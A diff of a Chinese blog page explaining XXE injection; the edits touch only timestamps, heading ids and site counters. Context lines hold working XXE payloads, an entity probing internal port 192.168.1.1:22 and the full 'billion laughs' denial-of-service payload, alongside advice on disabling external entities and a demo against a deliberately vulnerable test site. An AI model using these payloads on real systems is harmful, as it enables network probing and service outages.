@@ -57,7 +57,7 @@
 <meta property="og:image" content="http://static.zybuluo.com/xmy2017/80bh297gc517bgbd4jgb3av0/2.png">
 <meta property="og:image" content="http://static.zybuluo.com/xmy2017/7t8ta1ml3myk4khppoocla6b/3.png">
 <meta property="article:published_time" content="2020-01-14T03:05:43.000Z">
-<meta property="article:modified_time" content="2020-01-14T03:12:58.276Z">
+<meta property="article:modified_time" content="2020-01-14T03:32:05.560Z">
 <meta property="article:author" content="小蚂蚁的小窝">
 <meta property="article:tag" content="XXE注入">
 <meta name="twitter:card" content="summary">
@@ -240,7 +240,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-01-14 11:05:43 / 修改时间：11:12:58" itemprop="dateCreated datePublished" datetime="2020-01-14T11:05:43+08:00">2020-01-14</time>
+              <time title="创建时间：2020-01-14 11:05:43 / 修改时间：11:32:05" itemprop="dateCreated datePublished" datetime="2020-01-14T11:05:43+08:00">2020-01-14</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -304,7 +304,7 @@
 &lt;!DOCTYPE ANY [  
 &lt;!ENTITY test SYSTEM &quot;http://192.168.1.1:22&quot;&gt;  
 ]&gt; 
-&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre><h4 id="2-6-拒绝服务攻击"><a href="#2-6-拒绝服务攻击" class="headerlink" title="2.6 拒绝服务攻击"></a>2.6 拒绝服务攻击</h4><p>　　Payload如下：</p>
+&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p>　　Payload如下：</p>
 <pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
 &lt;!DOCTYPE lolz [
 &lt;!ENTITY lol &quot;lol&quot;&gt;
@@ -319,8 +319,8 @@
 &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
 &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;
 &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p>上面样例中的XXE漏洞攻击就是著名的“billion laughs”(<a href="https://en.wikipedia.org/wiki/Billion_laughs" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Billion_laughs</a>)攻击，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
-<h3 id="3-漏洞防御"><a href="#3-漏洞防御" class="headerlink" title="3.漏洞防御"></a>3.漏洞防御</h3><p>　　XXE漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p>
-<h3 id="4-漏洞演示"><a href="#4-漏洞演示" class="headerlink" title="4.漏洞演示"></a>4.漏洞演示</h3><p>　　演示示例来自<a href="http://testhtml5.vulnweb.com/" target="_blank" rel="noopener">http://testhtml5.vulnweb.com/</a>，这是一个Acunetix维护的demo站点，用于测试Acunetix web扫描器的功能。XXE注入漏洞的测试点在Login处的“Forget Pwd”：<br><img src="http://static.zybuluo.com/xmy2017/egopruw2sq5hqjv9mhs8tqdp/1.png" alt="1.png-90.4kB"><br>用Burpsuite抓包如下：<br> <img src="http://static.zybuluo.com/xmy2017/80bh297gc517bgbd4jgb3av0/2.png" alt="2.png-44.7kB"><br>构造测试Payload如下：<br> <img src="http://static.zybuluo.com/xmy2017/7t8ta1ml3myk4khppoocla6b/3.png" alt="3.png-55.2kB"><br>可见服务器执行了Payload，该页面易受XXE注入攻击。</p>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>　　XXE漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p>
+<h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>　　演示示例来自<a href="http://testhtml5.vulnweb.com/" target="_blank" rel="noopener">http://testhtml5.vulnweb.com/</a>，这是一个Acunetix维护的demo站点，用于测试Acunetix web扫描器的功能。XXE注入漏洞的测试点在Login处的“Forget Pwd”：<br><img src="http://static.zybuluo.com/xmy2017/egopruw2sq5hqjv9mhs8tqdp/1.png" alt="1.png-90.4kB"><br>用Burpsuite抓包如下：<br> <img src="http://static.zybuluo.com/xmy2017/80bh297gc517bgbd4jgb3av0/2.png" alt="2.png-44.7kB"><br>构造测试Payload如下：<br> <img src="http://static.zybuluo.com/xmy2017/7t8ta1ml3myk4khppoocla6b/3.png" alt="3.png-55.2kB"><br>可见服务器执行了Payload，该页面易受XXE注入攻击。</p>
 <p>参考：<br><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126788.html</a><br><a href="http://www.91ri.org/9539.html" target="_blank" rel="noopener">http://www.91ri.org/9539.html</a></p>
 
     </div>
@@ -406,7 +406,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE注入攻击简介"><span class="nav-number">1.</span> <span class="nav-text">XXE注入攻击简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE注入利用"><span class="nav-number">2.</span> <span class="nav-text">XXE注入利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简单检测"><span class="nav-number">2.1.</span> <span class="nav-text">简单检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件读取"><span class="nav-number">2.2.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加载外部实体"><span class="nav-number">2.3.</span> <span class="nav-text">加载外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#执行系统命令"><span class="nav-number">2.4.</span> <span class="nav-text">执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#探测内网端口"><span class="nav-number">2.5.</span> <span class="nav-text">探测内网端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-6-拒绝服务攻击"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 拒绝服务攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-漏洞防御"><span class="nav-number">3.</span> <span class="nav-text">3.漏洞防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-漏洞演示"><span class="nav-number">4.</span> <span class="nav-text">4.漏洞演示</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE注入攻击简介"><span class="nav-number">1.</span> <span class="nav-text">XXE注入攻击简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE注入利用"><span class="nav-number">2.</span> <span class="nav-text">XXE注入利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简单检测"><span class="nav-number">2.1.</span> <span class="nav-text">简单检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件读取"><span class="nav-number">2.2.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加载外部实体"><span class="nav-number">2.3.</span> <span class="nav-text">加载外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#执行系统命令"><span class="nav-number">2.4.</span> <span class="nav-text">执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#探测内网端口"><span class="nav-number">2.5.</span> <span class="nav-text">探测内网端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拒绝服务攻击"><span class="nav-number">2.6.</span> <span class="nav-text">拒绝服务攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞防御"><span class="nav-number">3.</span> <span class="nav-text">漏洞防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞演示"><span class="nav-number">4.</span> <span class="nav-text">漏洞演示</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -420,20 +420,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
